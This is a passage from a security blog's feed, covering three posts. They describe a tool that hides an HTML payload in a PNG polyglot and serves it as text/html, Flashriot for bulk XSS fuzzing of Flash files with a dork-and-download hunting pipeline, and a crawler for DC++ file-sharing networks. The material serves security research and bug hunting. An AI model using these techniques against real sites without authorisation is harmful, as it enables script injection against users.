&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.-&lt;span class="o"&gt;[&lt;/span&gt;tunnelshade@MacBook-Pro.local:~/workspace/misc/poly&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;-&amp;gt;$ python2 convert.py -i cat.png -p payload.html -o cute_kitty.png
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Opening payload and converting to bit string
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Hiding data in LSB
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Saving intermediate PNG
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Opening intermediate png &lt;span class="k"&gt;for&lt;/span&gt; adding loader
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Writing PNG header
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Writing IHDR chunk
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Minifying loader html
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Writing iTXt chunk containing loader
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Writing the remaining data
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Sample Polyglot with alert() payload&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Innocent cat becomes evil" src="https://i.imgur.com/tiEFZbc.png"&gt;&lt;/p&gt;
&lt;h4&gt;Serving the Polyglot&lt;/h4&gt;
&lt;p&gt;The image has to be served with a &lt;strong&gt;text/html&lt;/strong&gt; content type. If not, the browser parser will
ignore the html part and just render the image. Below is a sample python script which when run in the
same directory as of the image, will serve the png with html content type.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;SimpleHTTPServer&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;SocketServer&lt;/span&gt;

&lt;span class="n"&gt;PORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8000&lt;/span&gt;

&lt;span class="n"&gt;Handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SimpleHTTPServer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SimpleHTTPRequestHandler&lt;/span&gt;
&lt;span class="n"&gt;Handler&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extensions_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="n"&gt;httpd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SocketServer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TCPServer&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;Handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Serving at http://127.0.0.1:&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serve_forever&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="tools"></category></entry><entry><title>Flashriot - Using Flashbang for bulk analysis</title><link href="https://tunnelshade.in/blog/2015/05/flashriot/" rel="alternate"></link><published>2015-05-22T00:00:00+05:30</published><updated>2015-05-22T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2015-05-22:/blog/2015/05/flashriot/</id><summary type="html">&lt;p&gt;I recently had the necessity to test multiple flash files for XSS. &lt;a href="https://cure53.de/flashbang"&gt;Flashbang&lt;/a&gt;
is an awesome tool for this kind of work. Since Flashbang needs a browser to run, the only way to automate it for
multiple files is to use a headless browser like &lt;a href="http://phantomjs.org"&gt;PhantomJS&lt;/a&gt;. So, it was easy â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;I recently had the necessity to test multiple flash files for XSS. &lt;a href="https://cure53.de/flashbang"&gt;Flashbang&lt;/a&gt;
is an awesome tool for this kind of work. Since Flashbang needs a browser to run, the only way to automate it for
multiple files is to use a headless browser like &lt;a href="http://phantomjs.org"&gt;PhantomJS&lt;/a&gt;. So, it was easy to build a
wrapper script as I know my way around Flashbang.&lt;/p&gt;
&lt;h3&gt;Usage&lt;/h3&gt;
&lt;p&gt;The least amount of time for this whole tool was spent for deciding its name i.e 1 second, hence the misleading
name. The wrapper script is available at &lt;a href="https://github.com/tunnelshade/flashriot"&gt;github.com/tunnelshade/flashriot&lt;/a&gt;.
Some key things on using this tool:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PhantomJS, Python2 and Flashbang itself are necessary to run this. If you are on OSX, you can install phantomjs
using homebrew.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run the shell script using proper arguments.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./flashriot.sh ~/workspace/flash-files/ ~/workspace/Flashbang/
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Keep cheking the window periodically. Even if the script hangs, use &lt;strong&gt;Ctrl+C&lt;/strong&gt; and start the script again. Flashriot
will only run flashbang on unprocessed files.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The output for each flash file is written to a text file with the same name. For a vulnerable &lt;strong&gt;ZeroClipboard.swf&lt;/strong&gt;, we have
the following &lt;strong&gt;ZeroClipboard.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; ZeroClipboard.txt &amp;lt;&lt;span class="o"&gt;==&lt;/span&gt;
&lt;span class="o"&gt;========================&lt;/span&gt;
Detected Flash &lt;span class="nv"&gt;variables&lt;/span&gt;
&lt;span class="o"&gt;========================&lt;/span&gt;
id:eval
width
&lt;span class="nv"&gt;height&lt;/span&gt;
&lt;span class="o"&gt;========================&lt;/span&gt;
&lt;span class="o"&gt;===================&lt;/span&gt;
Detected Sink &lt;span class="nv"&gt;calls&lt;/span&gt;
&lt;span class="o"&gt;===================&lt;/span&gt;
---------------
Flash variables
---------------
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;someDummyPayloadWhichHasToBeThereInOnePiece&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;width&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;4232&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;height&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;2079&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
----
Sink
----
&lt;span class="nb"&gt;eval&lt;/span&gt;
---------
Sink Data
---------
try &lt;span class="o"&gt;{&lt;/span&gt;__flash__toXML&lt;span class="o"&gt;(&lt;/span&gt;ZeroClipboard.dispatch&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;someDummyPayloadWhichHasToBeThereInOnePiece&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;load&amp;quot;&lt;/span&gt;,null&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt; catch &lt;span class="o"&gt;(&lt;/span&gt;e&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;undefined/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
------------------
Replaced Sink Data
------------------
try &lt;span class="o"&gt;{&lt;/span&gt;__flash__toXML&lt;span class="o"&gt;(&lt;/span&gt;ZeroClipboard.dispatch&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;@@@id@@@&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;load&amp;quot;&lt;/span&gt;,null&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt; catch &lt;span class="o"&gt;(&lt;/span&gt;e&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;undefined/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
-------------------
Vulnerable variable
-------------------
&lt;span class="nv"&gt;id&lt;/span&gt;
&lt;span class="o"&gt;===================&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After completion, just skim through the file outputs. I use the following command to see the file specific output.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tail -n +1 *.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sometimes, it is benificial to see the console output as well. For example from the following console output we can understand that
some kind of request was done and parsing failed. This mostly happens when a valid xml file is not supplied which might be due to an
improper path in a flash variable. Flashbang is not yet smart enough to detect a XML file call and fuzz using a XML file. If implemented,
this will be awesome.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Going to fuzz /Users/tunnelshade/workspace/src/github.com/cure53/Flashbang/flash-files/files/tagcloud.swf
Using url: http://127.0.0.1:9000/tagcloud.swf
------------ Launching new instance ------------
SyntaxError in ToXML

  http://127.0.0.1:9001/shumway/src/avm2/xml.js:506 in toXML
  http://127.0.0.1:9001/shumway/src/avm2/xml.js:717 in ASXML
  http://127.0.0.1:9001/shumway/src/avm2/xml.js:712 in ASXML
  http://127.0.0.1:9001/shumway/src/avm2/domain.js:266 in apply
  http://127.0.0.1:9001/shumway/src/avm2/runtime.js:498 in asCallProperty
  :7 in fn251
  http://127.0.0.1:9001/shumway/src/avm2/scope.js:178 in boundMethod
  http://127.0.0.1:9001/shumway/src/flash/events/EventDispatcher.js:101 in processListeners
  http://127.0.0.1:9001/shumway/src/flash/events/EventDispatcher.js:79 in doDispatchEvent
  http://127.0.0.1:9001/shumway/src/flash/events/EventDispatcher.js:252 in dispatchEventFunction
  http://127.0.0.1:9001/shumway/src/avm2/runtime.js:498 in asCallProperty
  :13 in EventDispatcher&lt;span class="nv"&gt;$$&lt;/span&gt;BgdispatchEvent
  http://127.0.0.1:9001/shumway/src/avm2/runtime.js:498 in asCallProperty
  :6 in URLLoader&lt;span class="nv"&gt;$$&lt;/span&gt;G_muXFIonStreamComplete
  :0 in URLLoader&lt;span class="nv"&gt;$$&lt;/span&gt;G_muXFIonStreamComplete
  http://127.0.0.1:9001/shumway/src/flash/events/EventDispatcher.js:133 in processListeners
  http://127.0.0.1:9001/shumway/src/flash/events/EventDispatcher.js:79 in doDispatchEvent
  http://127.0.0.1:9001/shumway/src/flash/events/EventDispatcher.js:223 in dispatchEvent
  http://127.0.0.1:9001/shumway/src/flash/net/URLStream.js:92 in onclose
  http://127.0.0.1:9001/shumway/examples/inspector/js/classes/BinaryFileReader.js:79 in onreadystatechange
Done, now proceeding to clean up
------------ Killing used instance ------------
------------ Launching new instance ------------
Done, now proceeding to clean up
------------ Killing used instance ------------
------------ Launching new instance ------------
Done, now proceeding to clean up
------------ Killing used instance ------------
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Bug Hunters!&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;When bug hunting, search for all flash files for the domains. Either use google dorking (&lt;strong&gt;site: ext:swf&lt;/strong&gt;) or
&lt;a href="https://github.com/tunnelshade/thedumpster"&gt;thedumpster&lt;/a&gt; to gather all flash file urls.&lt;/li&gt;
&lt;li&gt;Then use &lt;strong&gt;wget&lt;/strong&gt; or similar tool to download them into a folder.&lt;/li&gt;
&lt;li&gt;Run &lt;strong&gt;Flashriot&lt;/strong&gt; on those files.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;BOOM!!&lt;/strong&gt; for any bugs you might find.&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkdir hunting&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; hunting&lt;span class="p"&gt;;&lt;/span&gt;
$ python3 thedumpster.py -a &lt;span class="s2"&gt;&amp;quot;ext:swf&amp;quot;&lt;/span&gt; -o urls.txt swag_seller.com
$ wget -i urls.txt
$ sh flashriot.sh ./ ~/workspace/Flashbang
$ tail -n +1 *.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;</content><category term="tools"></category><category term="info"></category></entry><entry><title>Crawler for NMDC networks</title><link href="https://tunnelshade.in/blog/2015/05/building-dc-crawler/" rel="alternate"></link><published>2015-05-02T00:00:00+05:30</published><updated>2015-05-02T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2015-05-02:/blog/2015/05/building-dc-crawler/</id><summary type="html">&lt;p&gt;What is the meaning of a crawler in a file sharing network? Very simple for me. Something that collects all
the files that are shared by clients on that dc network. But collecting all the shared files is a huge task. So, I
reduced my task to just collecting metadata â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;What is the meaning of a crawler in a file sharing network? Very simple for me. Something that collects all
the files that are shared by clients on that dc network. But collecting all the shared files is a huge task. So, I
reduced my task to just collecting metadata and organising that information. Metadata about shared files in a dc
network is nothing but the file lists that the client softwares create. The main point of crawling is for stats.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;FileListing&lt;/span&gt; &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;CID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PQ5QETB5G44DH36XGW7INMWHPH6WDDX5KUGCCIY&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Base=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Generator=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;DC++ 0.843&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;F:_&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fimap_alpha_v09&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;config&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;generic.xml&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2235&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;6BS6CZ2DQJ6LFZYQCKBC6C5GUHSVLPCCJCTM7BQ&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;perl.xml&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1685&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;JPHFI42ZEPPT4JM772H2Q4W2PDKKTWA4TAE3NDI&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;php.xml&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;7835&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;S7WKKYRMANXTMEP4HCIKM6VNDVLSQTYD5EZHEBY&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;doc&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;AUTHORS&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;345&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;MJ4TIIXYJZF57ZHNSTECX3OZPVX3CQD7AXHAR2Y&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;LICENSE&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;17987&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;MRQYN544QVRPQIB4ZPYDXYGP6KSBZUI2V2J3HHY&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;THX&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2642&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PSCYZ37EZYTONNWROEBIMFXEQ3ZIDUQZUIUK4NA&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xgoogle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;__init__.py&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1354&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;7MGPO5Y5SKPOI3FI2Z4QSJNA3PBSXPLOJBIGWHA&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;browser.py&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;4543&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;DWSYNHG46ROVBFFLBM5MO72IMBKXYVTPZDIROHQ&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;sponsoredlinks.py&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;7999&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;EIG7R35X7DAON6INPYBO5OSLCQELVOOSCE4TYHI&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;crawler.py&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;5873&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;6WVCYHBICDJWFRONNTPKB4FUBG4FU2FVDJGQUFQ&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fimap.py&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;32569&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TFWMQYA3OAYTJTXIFDMCBGTNX7RUGVZXBTSOESI&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;File&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Andrew Ng- Deep Learning.mp4&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Size=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;244082418&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;TTH=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ZDRCQLMCUCBAN2MTN3NB3V5FHSERQY3XQNPO6KA&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/FileListing&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since a db is needed to store all the data, I decided to use &lt;strong&gt;PostgreSQL&lt;/strong&gt;. The reason being that I had some experience with
it as we use the same in OWTF. Writing SQL queries is a pain for this pet project, so I decided to use &lt;strong&gt;SQLAlchemy ORM&lt;/strong&gt;.&lt;/p&gt;
&lt;h4&gt;Models&lt;/h4&gt;
&lt;p&gt;There are only two models for this crawler.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;User&lt;/li&gt;
&lt;li&gt;File&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Both are joined by a many to many relationship as same file can be with multiple users and a user will have multiple files.&lt;/p&gt;
&lt;h4&gt;Configuration&lt;/h4&gt;
&lt;p&gt;The crawler is &lt;a href="https://github.com/tunnelshade/dcfury/blob/master/nmdc.py"&gt;here&lt;/a&gt;. The db settings are present to the end of
the file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db_settings&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DATABASE_IP&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;db_settings&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DATABASE_PORT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;5432&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;db_settings&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DATABASE_NAME&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;dcrawl&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;db_settings&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DATABASE_USER&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;crawl_bot&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;db_settings&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DATABASE_PASS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;crawl_bot&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Usage&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Get the crawler script, better if you get the whole &lt;a href="https://github.com/tunnelshade/dcfury"&gt;repo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Configure the database settings, i.e create the db role and db if necessary. There is a helper script called &lt;em&gt;db_setup.sh&lt;/em&gt; script
in the repo&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Since this was an experimental project, if you wish to listen/crawl a particular hub, you have to edit the crawler. Find the following
line and change the ip and port to the desired value.&lt;/p&gt;
&lt;p&gt;:::python
